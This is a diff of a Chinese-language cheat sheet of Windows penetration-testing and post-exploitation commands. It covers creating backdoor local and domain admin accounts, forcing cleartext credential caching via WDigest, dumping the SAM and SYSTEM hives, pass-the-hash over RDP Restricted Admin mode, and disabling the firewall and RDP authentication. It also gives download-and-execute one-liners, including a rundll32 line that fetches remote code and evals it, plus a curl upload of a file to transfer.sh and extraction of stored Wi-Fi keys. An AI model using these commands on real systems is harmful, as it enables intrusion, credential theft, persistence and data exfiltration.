@@ -1,256 +1,164 @@
 windows命令收集
+
 1. net命令
-
 查看用户列表: net user
-
 powershell查看用户列表: Get-WmiObject -Class Win32_UserAccount
-
 查看用户组列表: net localgroup
-
 查看管理组列表: net localgroup Administrators
-
 添加用户并设置密码: net user ASP.NET P@ssw0rd /add
-
 将用户加入管理组: net localgroup Administrators ASP.NET /add
-
 将用户加入桌面组: net localgroup "Remote Desktop Users" guest /add
-
 激活guest用户: net user guest /active:yes
-
 更改guest用户的密码: net user guest P@ssw0rd
-
 将用户加入管理组: net localgroup administrators guest /add
-
 将用户加入桌面组: net localgroup "Remote Desktop Users" guest /add
-
 查看本地密码策略: net accounts
-
 查看当前会话: net session
-
 建立IPC会话: net use \\127.0.0.1\c$ "P@ssw0rd" /user:"domain\Administrator"
 
 2. 域渗透命令
-
 查看当前用户权限: whoami /user
-
 可知域名为和其他信息: net config workstation
-
 查询域用户：net user /domain
-
 添加域用户: net user ASP.NET Admin12345 /add /domain
-
 添加域管理员: net group "domain admins" ASP.NET /add /domain
-
 添加企业管理员: net group "enterprise admins" /add /domain
-
 查询域管理员用户：net group "domain admins" /domain
-
 查询域企业管理组: net group "enterprise admins" /domain
-
 查询域本地管理组: net localgroup administrators /domain
-
 查询域控制器和时间：net time /domain
-
 查询域名称：net view /domain
-
 查询域内计算机：net view /domain:redteam.local
-
 查看当前域内计算机列表: net group "domain computers" /domain
-
 查看域控机器名: net group "domain controllers" /domain
-
 查看域密码策略: net accounts /domain
-
 查看域信任: nltest /domain_trusts
-
 查看某个域的域信任: nltest /domain_trusts /all_trusts /v /server:10.10.10.10
-
 通过srv记录: nslookup -type=SRV _ldap._tcp.corp
+
 3. 信息收集命令
-
 查看当前用户的安全特权: whoami /priv
-
 查看当前用户: whoami /user
-
 查看当前登陆用户: query user && quser
-
 查看系统版本和补丁信息: systeminfo
-
 查看系统开放端口: netstat -ano
-
 查看系统进程: tasklist /svc
-
 列出详细进程: tasklist /V && tasklist /V /FO CSV
-
 查看ip地址和dns信息: ipconfig /all
-
 查看当前用户保存的凭证: cmdkey /list
-
-查看路由信息:route print
-
+查看路由信息: route print
 查看arp列表: arp -a
-
 查看当前用户保存的票据凭证: klist
+列出c盘Users文件夹: dir /b c:\Users
+搜索D盘磁盘名字为logo.jpg的文件: cd /d D:\ && dir /b /s logo.jpg
+搜素C盘文件夹下后缀conf内容有password: findstr /s /i /n /d:C:\ "password" *.conf
+查找Windows目录下面的Bluetooth.dll文件: where /R C:\windows Bluetooth.dll
+查看3389端口: for /f "tokens=2" %i in ('tasklist /FI "SERVICES eq TermService" /NH') do netstat -ano | findstr %i | findstr LISTENING
+Windows存储的凭证: rundll32 keymgr.dll,KRShowKeyMgr
 
-列出c盘Users文件夹:
-
-dir /b c:\Users
-搜索D盘磁盘名字为logo.jpg的文件:
-
-cd /d D:\ && dir /b /s logo.jpg
-搜素C盘文件夹下后缀conf内容有password:
-
-findstr /s /i /n /d:C:\ "password" *.conf
-查找Windows目录下面的Bluetooth.dll文件:
-
-where /R C:\windows Bluetooth.dll
-查看3389端口:
-
-for /f "tokens=2" %i in ('tasklist /FI "SERVICES eq TermService" /NH') do netstat -ano | findstr %i | findstr LISTENING
-Windows存储的凭证:
-
-rundll32 keymgr.dll,KRShowKeyMgr
 4.注册表相关
-LocalAccountTokenFilterPolicy-启用任何管理员用户横向
-
+LocalAccountTokenFilterPolicy-启用任何管理员用户横向：
 reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
 查看3389端口:
-
 REG query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber
 开启远程桌面:
-
 REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
 注册表抓取明文:
-
 REG ADD HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
 rdp连接默认的10个记录:
-
 reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default"
 rdp连接默认的所有记录:
-
 reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /s
 查找软件安装目录:
-
 reg query HKLM /f foxmail /t REG_SZ /s
 reg导出注册表hash:
-
 reg save hklm\sam c:\programdata\sam.hive && reg save hklm\system c:\programdata\system.hive
 hash登录利用“Restricted Admin Mode“特性:
 新建DWORD键值DisableRestrictedAdmin，值为0，代表开启;值为1，代表关闭
-
 REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
 查看是否开启DisableRestrictedAdmin REG_DWORD 0x0 存在就是开启
-
 REG query "HKLM\System\CurrentControlSet\Control\Lsa" | findstr "DisableRestrictedAdmin"
-然后如果hash正确就可以登录目标主机
-
+然后如果hash正确就可以登录目标主机：
 mstsc.exe /restrictedadmin
 CredSSP 加密数据库修正:
-
 reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters" /f /v AllowEncryptionOracle /t REG_DWORD /d 2
 取消仅允许运行使用网络界别身份验证的远程桌面的计算机连接:
-
 REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0
+
 5. 系统下载文件:
 windows2003默认文件:
-
 Blob0_0.bin //可以正常执行
 certutil下载文件:
-
 certutil -urlcache -split -f http://127.0.0.1:8080/nc.txt c:\nc.txt
 2.1 certutil删除记录:
-
-
 certutil -urlcache -split -f http://127.0.0.1:8080/nc.txt delete
 bitsadmin下载文件:
-
 bitsadmin /rawreturn /transfer getfile http://download.sysinternals.com/files/PSTools.zip c:\Pstools.zip
 powershell下载文件:
-
 powershell -nop -exec bypass -c (new-object System.Net.WebClient).DownloadFile('http://127.0.0.1/nc.txt','nc.exe')
 msedge下载并执行:
-
 cmd /c start /min msedge.exe http://127.0.0.1/test.zip && timeout 5 && taskkill /f /t /im msedge.exe && C:/Users/%UserName%/Downloads/test.zip
 rundll32下载文件
-
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://192.168.3.150/chfs/shared/1Z3.exe",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
+
 设置网卡netsh和防火墙信息
-查看网卡信息
-
-
+查看网卡信息：
 netsh interface show interface
-设置主dns
-
-
+设置主dns：
 netsh interface ip set dns "以太网" static 114.114.114.114 primary
-设置备dns
-
-
+设置备dns：
 netsh interface ip add dns "以太网" 8.8.8.8
-查看防火墙状态
-
-
+查看防火墙状态：
 netsh advfirewall show allprofiles
-防火墙恢复默认配置
-
-
+防火墙恢复默认配置：
 netsh firewall reset
-开启防火墙
-
-
+开启防火墙：
 netSh Advfirewall set allprofiles state on
-关闭防火墙
-
-
+关闭防火墙：
 netSh Advfirewall set allprofiles state off
-放行3389端口
-
-
+放行3389端口：
 netsh advfirewall firewall add rule name=3389_test dir=in action=allow protocol=TCP localport=3389
+
 查看本机WiFi信息和配置
-查看当前用户wifi配置文件
-
+查看当前用户wifi配置文件：
 netsh wlan show profiles
-查看当前连接的wifi
-
+查看当前连接的wifi：
 netsh wlan show interface
-查看本机WiFi配置和密码:
-
+查看本机WiFi配置和密码:：
 netsh wlan show profile "ssid" key=clear
-枚举所有连接过的wifi:
-
+枚举所有连接过的wifi:：
 for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear
-连接他配置文件的其它wifi
-
+连接他配置文件的其它wifi：
 netsh wlan connect name=ssid
-文件上传
 
+文件上传：
 curl -k --upload-file win.exe https://transfer.sh --progress-bar
+
 sc命令
 
 创建服务: sc \\127.0.0.1 create Emeripe binPath= "cmd.exe /c start c:\programdata\info.bat"
 启动服务: sc \\127.0.0.1 start Emeripe
 删除服务: sc \\127.0.0.1 delete Emeripe
-远程桌面登录到 console 会话解决 hash 无法抓出问题
 
+远程桌面登录到 console 会话解决 hash 无法抓出问题：
 mstsc /admin
-将用户会话连接到远程桌面会话
 
+将用户会话连接到远程桌面会话：
 tscon ID(quser)
+
 根据进程名字终止进程:
-
 taskkill /f /t /im msedge.exe
+
 根据进程pid终止进程:
-
 taskkill /f /pid 17676
-tasklist查看远程主机进程:
 
+tasklist查看远程主机进程:
 tasklist /s 192.168.3.200 /u Aadministrator /p Password
 tasklist /s 192.168.3.110 /u offensive\administrator /P Password /V
+
 runas启动其它用户进程:
-
 runas /user:administrator /savecred "cmd.exe /k whoami"
-windows开机启动路径
 
+windows开机启动路径：
 C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
 C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
